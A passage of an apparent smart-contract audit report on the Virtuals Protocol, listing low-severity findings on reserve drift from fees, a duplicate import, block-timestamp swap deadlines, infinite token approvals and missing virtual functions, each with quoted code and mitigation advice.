class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-19\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-19\" aria-label=\"impact 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThe reserves recorded by the pair contract may diverge from the actual token balances after repeated trades, leading to inaccurate price calculations and potential arbitrage opportunities.\u003c/li\u003e\n\u003cli\u003eOver time, this could degrade the integrity of the AMM’s pricing and reserve logic, especially if fees are significant or trading volume is high.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-35\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-35\" aria-label=\"recommended mitigation steps 35 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo maintain reserve consistency, fees should be deducted before calculating the swap output and updating reserves. This ensures that the reserves always match the actual balances and reflect the true state of the pool. For example, the fee can be incorporated into the amount calculation or deducted from the input before calling the swap, so that the pair’s reserve update logic remains accurate.\u003c/p\u003e\n\u003ch2 id=\"06-duplicate-import-statement-for-agentfactoryv3sol-in-fgenesissol\" style=\"position:relative;\"\u003e\u003ca href=\"#06-duplicate-import-statement-for-agentfactoryv3sol-in-fgenesissol\" aria-label=\"06 duplicate import statement for agentfactoryv3sol in fgenesissol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[06] Duplicate import statement for \u003ccode\u003eAgentFactoryV3.sol\u003c/code\u003e in \u003ccode\u003eFGenesis.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eIn \u003ccode\u003eFGenesis.sol\u003c/code\u003e, the module \u003ccode\u003eAgentFactoryV3.sol\u003c/code\u003e is imported twice at the top of the file:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"137\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../virtualPersona/AgentFactoryV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Line 8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../virtualPersona/AgentFactoryV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Line 11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis duplication is unnecessary and could lead to confusion for maintainers or reviewers. While it does not directly impact contract functionality or security, it is a code quality issue that can be easily avoided. Redundant imports may also introduce ambiguity if the file is refactored in the future or if conditional compilation is used.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-36\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-36\" aria-label=\"recommended mitigation steps 36 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRemove the redundant import statement so that \u003ccode\u003eAgentFactoryV3.sol\u003c/code\u003e is imported only once at the top of the contract file.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/genesis/FGenesis.sol#L8-L11\"\u003eFGenesis.sol#L8-L11\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"138\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../virtualPersona/AgentFactoryV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../virtualPersona/AgentFactoryV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"07-misconception-in-using-blocktimestamp--x-for-swap-deadlines\" style=\"position:relative;\"\u003e\u003ca href=\"#07-misconception-in-using-blocktimestamp--x-for-swap-deadlines\" aria-label=\"07 misconception in using blocktimestamp  x for swap deadlines permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[07] Misconception in using \u003ccode\u003eblock.timestamp + X\u003c/code\u003e for swap deadlines\u003c/h2\u003e\n\u003cp\u003eA common misconception in DeFi contracts is that setting a swap deadline as \u003ccode\u003eblock.timestamp + X\u003c/code\u003e (e.g., \u003ccode\u003eblock.timestamp + 5 minutes\u003c/code\u003e) ensures the transaction is only valid for a real-world time window after the user initiates it. This pattern is used in both \u003ccode\u003eUniswapV2Router02\u003c/code\u003e and \u003ccode\u003eAgentTax.sol\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/tax/AgentTax.sol#L227-L228\"\u003eAgentTax.sol#L227-L228\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"139\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Router02\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapExactETHForTokensSupportingFeeOnTransferTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e{value: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e}(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminutes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// AgentTax.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountToSwap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e300\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, \u003ccode\u003eblock.timestamp\u003c/code\u003e reflects the timestamp of the block in which the transaction is included, not when it was submitted. As a result, if a transaction is submitted at time \u003ccode\u003eT0\u003c/code\u003e but only included in a block at \u003ccode\u003eT0 + 1 hour\u003c/code\u003e, the deadline will still be valid as long as the block’s timestamp is less than the deadline. This means the window is relative to block inclusion, not user intent.\u003c/p\u003e\n\u003ch3 id=\"impact-20\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-20\" aria-label=\"impact 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUsers and developers may believe they are enforcing a strict real-world window for transaction validity, but in reality, the transaction may be included much later than intended.\u003c/li\u003e\n\u003cli\u003eThis can lead to unexpected execution, stale pricing, or MEV exploitation if the transaction sits in the mempool for an extended period.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-37\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-37\" aria-label=\"recommended mitigation steps 37 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIf the intent is to enforce a real-world time window, the contract should:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAccept a client-supplied timestamp of when the transaction was initiated and compare \u003ccode\u003eblock.timestamp\u003c/code\u003e to that value plus the allowed window.\u003c/li\u003e\n\u003cli\u003eAlternatively, use off-chain logic to cancel or replace transactions that are not mined within the desired time frame.\u003c/li\u003e\n\u003cli\u003eAt minimum, document this limitation in the contract and user documentation to avoid misunderstanding.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"08-widespread-use-of-infinite-token-approvals\" style=\"position:relative;\"\u003e\u003ca href=\"#08-widespread-use-of-infinite-token-approvals\" aria-label=\"08 widespread use of infinite token approvals permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[08] Widespread use of infinite token approvals\u003c/h2\u003e\n\u003cp\u003eThe protocol makes extensive use of infinite token approvals (\u003ccode\u003etype(uint256).max\u003c/code\u003e) across multiple contracts. While this is a common pattern in DeFi to save gas on repeated approvals, it can pose risks with certain token implementations. Examples include:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eBondingTax.sol:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"140\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eforceApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAgentMigrator.sol:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAgentFactory.sol:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"142\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAeroAdaptor.sol:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eforceApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-21\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-21\" aria-label=\"impact 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eSome ERC20 tokens (like COMP) may downcast the approval value to a smaller type (e.g., \u003ccode\u003euint96\u003c/code\u003e) rather than treating it as infinite. This can lead to:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003ePotential transaction failures if tokens downcast the approval value.\u003c/li\u003e\n\u003cli\u003eIncreased risk if a spender contract is compromised, as they have unlimited approval.\u003c/li\u003e\n\u003cli\u003eUnnecessary exposure to risk when large approvals aren’t needed.\u003c/li\u003e\n\u003cli\u003eGas wastage when approvals need to be reset due to downcasting.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-38\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-38\" aria-label=\"recommended mitigation steps 38 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eUse exact approval amounts instead of \u003ccode\u003etype(uint256).max\u003c/code\u003e where possible.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIf infinite approvals are necessary for gas optimization:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdd a function to revoke approvals when they’re no longer needed.\u003c/li\u003e\n\u003cli\u003eDocument which tokens are known to be compatible/incompatible.\u003c/li\u003e\n\u003cli\u003eConsider implementing approval amount checks for known problematic tokens.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eFor critical operations, consider implementing a pattern where approvals are set and used in the same transaction.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"09-missing-virtual-functions-for-inheritance\" style=\"position:relative;\"\u003e\u003ca href=\"#09-missing-virtual-functions-for-inheritance\" aria-label=\"09 missing virtual functions for inheritance permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[09] Missing \u003ccode\u003evirtual\u003c/code\u003e functions for inheritance\u003c/h2\u003e\n\u003cp\u003eSeveral internal functions across the codebase that are likely to need customization in derived contracts are not marked as \u003ccode\u003evirtual\u003c/code\u003e. This limits the ability to properly override these functions in inherited contracts and could force developers to duplicate code instead of extending it.\u003c/p\u003e\n\u003cp\u003eExample patterns that should be \u003ccode\u003evirtual\u003c/code\u003e 